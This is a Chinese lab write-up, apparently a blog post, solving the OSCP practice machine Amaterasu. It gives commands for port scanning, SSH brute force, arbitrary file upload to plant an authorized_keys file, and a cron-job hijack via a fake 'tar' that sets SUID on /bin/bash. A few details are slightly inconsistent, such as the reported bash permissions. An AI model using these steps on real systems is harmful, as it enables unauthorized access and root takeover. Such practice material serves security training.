# 原创
：  从WEB到内网&&文件上传&&SSH公私钥免密登录&&Cron job提权--------打靶经验分享

# 从WEB到内网&amp;&amp;文件上传&amp;&amp;SSH公私钥免密登录&amp;&amp;Cron job提权--------打靶经验分享

OSCP------Amaterasu<br/> 今天来打一个OSCP的靶机Amaterasu，难度中等，包含了端口探测，文件上传，ssh公私钥实现免密登录，定时任务提权等等…靶场难度中等，需要收集两个flag，一个flag低权限shell就可以获取，第二个要提权后才可以获取。希望大家能有所收获。

### 启动环境：

启动VPN：`openvpn universal.ovpn`<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/a5f31450fe344a09bd677b9f45492d95.png"/>

攻击机IP为: 192.168.45.201<br/> 启动目标靶机：<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/3c747500936d418c8554c65d870e910e.png"/>

目标靶机IP为：192.168.248.249

### 信息收集

**1.端口**<br/> nmap扫描端口：<br/> `nmap --min-rate 10000 -p- 192.168.248.249`<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/10061e57e4eb467494d7eff3281f52da.png"/>

探测到了：21,22,111,139,443,445,2049,10000,25022,33414,40080 端口<br/> 端口服务探测：<br/> `nmap -p 21,22,111,139,443,445,2049,10000,25022,33414,40080 -sV 192.168.248.249`<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/dad22e197ca540dcab22aa02abc0452c.png"/>

发现目标主机准确开放的端口为：<br/> 21-ftp、25022-ssh、33414-unknown、40080-http

**2.端口测试**

**2.1** 21-ftp端口<br/> 先试试直接ftp匿名登录连接过去（ftp匿名登录用户名为anonymous，密码为email或者为空）。<br/> `ftp 192.168.248.249`<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/fca425a4d848496d8bace0e6e11032cc.png"/>

空密码直接登陆成功。登录后看一下有什么文件，有什么线索（binary 以二进制模式传输文件，保证文件完整）。<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/62203028770b4d0ca45c50a2b4daf176.png"/>

什么都没有，21端口结束。

**2.2** 25022-ssh<br/> 直接尝试弱口令登录：<br/> `ssh 192.168.248.249 -p 25022`<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/b3ec155bc0fe4ffe9c06891a713124b3.png"/>

尝试了几个都失败了。那就直接上ssh爆破，字典用msf的。<br/> `hydra -l root -P /usr/share/wordlists/metasploit/unix_passwords.txt -t 6 -vV 192.168.248.249 ssh -s 25022`<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/8364214bea634616a09b4df5709272ad.png"/>

等待ing。

**2.3** 33414-unknow<br/> 刚才nmap出来的33414显示是unknown，详细再探测一下：<br/> `nmap -sT -sV -O -sC -p 33414 192.168.248.249`<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/b2f8b89cdfaf4efa85e119900fc5390c.png"/><br/> 看到了html代码，那就浏览器访问一下192.168.248.249:33414

<img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/2066d5573474455db7f5fd42487cb6b1.png"/><br/> 无法访问哇，再倒回去看看。<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/ce1cb93881e442b49383057115cf7e11.png"/><br/> Werkzeug/2.2.3 发现了这个服务。查了一下，Werkzeug是一个Python的WSGI工具库，用于构建Web应用程序和框架。Werkzeug提供了一套灵活的工具，用于处理HTTP请求和响应、路由请求、处理会话、进行调试等等。<br/> 还是继续用dirsearch扫一下把。<br/> `dirsearch -u http://192.168.248.249:33414/`<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/feafa1f3520f4c4281766a6cbdc8b8f5.png"/>

发现了help和info。<br/> 访问一下http://192.168.248.249:33414/help<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/04a029d3f7dd4c5ea9ac54bcbf7728c2.png"/><br/> 这大家第一眼关注的应该是文件上传了。<br/> 那就等下试试这个接口。还有一个40080端口。<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20440b9500e443b7963e9ab72a186945.png"/><br/> info里面是一些无用的信息。

**2.4** 40080端口http

http服务直接访问http://192.168.248.249:40080<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/10f07d2f523f4a81b00fdbcb6a2a5259.png"/><br/> Mozilla is cool！ 没什么用

### 攻击阶段

看一下/file-upload接口<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/d23088e540a0496bad035d23a7ea7379.png"/><br/> 方式不被允许。那就换成POST 试一下curl<br/> `curl -X POST http://192.168.248.249:33414/file-upload`<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/12d61b0656364a74aa4cb2cd220bd7b8.png"/><br/> 看来是要需要有上传的文件。curl通过POST上传文件。<br/> `touch shell.php`<br/> `curl -X POST -F file="@/home/czy1874396671/shell.php.txt" -F filename=shell.php http://192.168.248.249:33414/file-upload`<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/2ccd74008d8144a0a452320a11ff2c26.png"/><br/> 看来想上传一句话php行不通哇。<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/09992ef2065d430ba738c1d3ee1cbce6.png"/><br/> 改成了允许上传的文件格式上传成功<br/> 查看了一下文件上传的位置，发现是在/tmp目录下。<br/> `curl http://192.168.248.249:33414/file-list?dir=/tmp`<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/17c7275d75844c6cab12919280d90eb0.png"/><br/> 现在可以上传文件了，该怎么利用呢。试一下是否可以上传目录穿越。<br/> `curl -X POST -F file="@/home/czy1874396671/shell.php.txt" -F filename=../shell.php http://192.168.248.249:33414/file-upload`<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/8db0376f296f40d28e44963c1f656c3b.png"/><br/> 500,应该是没有权限。试一下路径读取，找一下普通用户能够有权限写入的地方。<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/7f60d6c4bcdc4321ac1513e487826fc4.png"/><br/> 找到了一个alfredo的用户，目录下面存在.ssh文件，这里试一下能不能上传。<br/> `curl -X POST -F file="@/home/czy1874396671/shell.php.txt" -F filename=/home/alfredo/.ssh/shell.php http://192.168.248.249:33414/file-upload`

<img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/3cd056a8356148aab599ae341db622c0.png"/><br/> 成功上传，有alfredo这个用户，创建一个shell.php.txt的公钥authorized_keys，上传之后可以进行密钥ssh登录。使用ssh-keygen生成公钥。<br/> `ssh-keygen -t rsa`<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/c5214793f26f46feb7db9f21ec3155c0.png"/><br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/34aa1c1d7f74425d8bb6663382502bc2.png"/><br/> 先重命名一下，便于上传。<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/aa3a18e1ab4a4e04be1836c15fc0a87c.png"/><br/> `curl -X POST -F file="@/home/czy1874396671/shell.php.txt.pub.txt" -F filename=/home/alfredo/.ssh/authorized_keys http://192.168.248.249:33414/file-upload`<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/3396ec170045456f97771d8e7905feb2.png"/><br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/22c7f0ce0fd04708a5fb272cd3b41c48.png"/><br/> 非常奈斯。

### 内网渗透

现在有了文件的公钥，使用文件的私钥文件进行ssh登录，之前的ssh25022端口。<br/> `ssh -i shell.php.txt alfredo@192.168.248.249 -p 25022`<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/92db940aecb8405e97e14e4e1361b126.png"/><br/> 有shell了，牛牛牛。<br/> 找flag：<br/> find / -name local.txt<br/> cat /home/alfredo/local.txt<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/852add03f0bc482eb543c6b528545bef.png"/><br/> flag1：18cc76acd2212102be9e0d61409fd62d

### 提权

1.sudo提权<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/78ac72f30a154bbd80cc3db8eebd8c43.png"/><br/> 需要密码。

2.suid提权<br/> `find / -perm -u=s -type f 2&gt;/dev/null`<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/4b538bdebba6486da08c68161012dd5e.png"/><br/> 没有可提权的东西。<br/> 3. -suid-getcap提权<br/> `/usr/sbin/getcap -r / 2&gt;/dev/null`<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/09474abe5a064bce8cc58d2ccf685f56.png"/><br/> 没有东西。

4.Cron job提权，寻找定时任务并修改进行提权<br/> cat /etc/crontab<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/16418c53f8bc4d71b8361839483d36e2.png"/><br/> 这个任务会每分钟执行一次 /usr/local/bin/backup-flask.sh 脚本。<br/> 看一下有没有修改权限。<br/> `ls -al cat /usr/local/bin/backup-flask.sh`<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/5ba32051d84546fd863dcaf45ae8aa69.png"/>

再查看它的内容：<br/> `cat /usr/local/bin/backup-flask.sh`<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/a87adfc8234241378573abe5f4e9fea2.png"/><br/> 这个脚本的主要功能是将 /home/alfredo/restapi 目录中的文件和子目录打包成一个压缩文件 /tmp/flask.tar.gz。<br/> 因为环境可控，所以我们自己做一个tar的命令进行任务计划帮助提权。

查看bash权限<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/2654defef22b465a8fdddc480bec72a7.png"/><br/> 写一个提bash权命令 增加suid<br/> `echo "chmod +u+s /bin/bash" &gt; tar`<br/> `cat tar`<br/> 增加执行权限<br/> `chmod +x tar`<br/> `cat tar`<br/> 等待一分钟，此时已经成功提升权限<br/> ls -al /bin/bash 即可看到 -rwxrwxrwx. 1 root root 1390080 Jan 25 2021 /bin/bash<br/> 直接bash -p即可完成提权，作者因为靶场时间已经到期，没来得及截图哈哈哈。<br/> 获取flag2：<br/> cat /root/proof.txt
